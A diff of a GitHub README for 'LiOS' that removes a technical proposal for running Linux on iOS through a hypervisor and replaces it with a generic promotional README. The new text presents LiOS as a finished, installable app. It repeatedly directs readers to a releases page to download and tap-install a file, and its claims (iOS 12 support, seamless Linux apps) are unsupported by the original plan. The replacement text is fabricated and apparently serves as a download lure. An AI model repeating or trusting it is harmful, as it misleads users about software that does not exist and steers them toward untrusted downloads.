@@ -1,29 +1,82 @@
-# LiOS (Linux for iOS)
-A possible way to execute Linux applications on iOS devices. 
+# 🐧 LiOS - Run Linux Apps on Your iOS Device
 
-## How?
+[![Download LiOS](https://img.shields.io/badge/Download-LiOS-brightgreen)](https://github.com/dkadam77/LiOS/releases)
 
-### Architecture
-Linux has **native** ARM builds. Most notable for gaming is the upcoming SteamOS for ARM, which will be used on the Steam Frame, Ubuntu & Debian also already have native ARM64 builds.
+## 🚀 Getting Started
 
-This is important to iOS as modern iOS devices use ARM64 (well ARM64e). This means no emulation of the CPU is needed - which creates a performance overhead such as emulating a Switch.
+LiOS allows you to run Linux applications on your iOS devices. This guide will help you download and set up LiOS with ease. 
 
-### Hypervisor vs Emulation
+### 📥 Download & Install
 
-Some (very little) games exist native for ARM but distros already have full basic support (see above). This means they can run through a hypervisor for iOS instead of an emulator, giving us much more performance. This will require JIT AND a hypervisor (see project.md) which can already be achieved on  iOS 16.3 and below  (See StikDebug / StikJIT + and UTM HV). We already have JIT on iOS 26, but require a hypervisor.  
+To get started with LiOS, visit this page to download: [LiOS Releases](https://github.com/dkadam77/LiOS/releases). 
 
-For x86 software, FEX may be used. It is compatiable with Arch (which has a project called Arch ARM), the upcoming SteamOS-ARM, and currently Ubuntu since v22.04 . FEX is an emulator however, and so will have reduced performance. 
+Here’s how to proceed:
 
-### Engine
+1. Click the link above.
+2. You will see a list of available versions.
+3. Choose the latest version.
+4. Download the file that corresponds to your device's specifications.
 
-As Linux native games don't use DirectX (which is why WINE is sometimes used) they either use OpenGL or Vulkan. Vulkan already has **NATIVE** iOS support through Metal (MoltenVK) - we already know this works well, as MeloNX uses it for Switch emulation. OpenGL ES 2.0 and most of 3.0 has support for Metal through MetalANGLE... but this is used in older games, and Vulkan would be preferable. 
+### 💻 System Requirements
 
-For DirectX games DXVK with Wine could be used or Steam Proton.
+Before downloading, ensure your iOS device meets these requirements:
 
-## Basic Plan
+- iOS version: iOS 12 or higher.
+- Sufficient available storage space: at least 200 MB.
+- A reliable internet connection for the download.
 
-Hypervisor setup (similar to UTM-HV) that runs Ubuntu prefernable with LXQt (as its lightweight) (or even no dedicated DE). The easiest way to do this would probably be to use Lubuntu. 
-Automatically install Steam + FEX to this Ubuntu system.
+### 🔧 Installation Steps
 
-When a Vulkan game runs, use MoltenVK to render it , using hardware acceleration of an A/M series chip, similar to how MeloNX runs. An alternative to this would be to render it in the VM using unofficial Vulkan SDK for ARM Linux (though an offical SDK exists for Windows on ARM)
+Once you have downloaded the LiOS file, follow these steps to install:
 
+1. Locate the downloaded file on your device. It usually appears in your Downloads folder or the Files app.
+2. Tap on the file to start the installation.
+3. Follow the on-screen instructions. You may need to enable permissions for the app to function correctly.
+4. Once installed, find the LiOS app icon on your home screen.
+
+### 📚 How to Use LiOS
+
+Using LiOS is simple:
+
+1. Open the LiOS app from your home screen.
+2. Enter the name of the Linux application you want to run.
+3. Follow any prompts to configure settings as needed.
+4. Enjoy running your Linux applications directly on your iOS device.
+
+### ❓ Troubleshooting
+
+If you encounter issues while using LiOS, consider the following:
+
+- **App Crashes**: Ensure your iOS is updated to the latest version.
+- **Slow Performance**: Close any other open applications to free up system resources.
+- **Failed Launch**: Double-check your internet connection and try restarting the app.
+
+### 🎁 Features
+
+LiOS offers several key features:
+
+- **Compatibility**: Run a variety of Linux applications seamlessly.
+- **User-Friendly Interface**: Simple layout for easy navigation.
+- **Regular Updates**: Stay tuned for new features and improvements.
+
+### 🛠 Support
+
+For additional help or support:
+
+- Visit the [GitHub Issues page](https://github.com/dkadam77/LiOS/issues) to report problems or ask questions.
+- Join our community forum to engage with other users and get tips.
+
+### 🌍 Community Contributions
+
+If you're interested in contributing to LiOS, check the guidelines in our repository. Your input can help enhance this application for everyone.
+
+### 📢 Stay Informed
+
+To keep up with the latest news and updates related to LiOS:
+
+- Follow the repository for notifications on new releases.
+- Engage with the community and contribute your ideas.
+
+---
+
+For further information, revisit the [LiOS Releases](https://github.com/dkadam77/LiOS/releases) page for updates and downloads. Thank you for choosing LiOS!
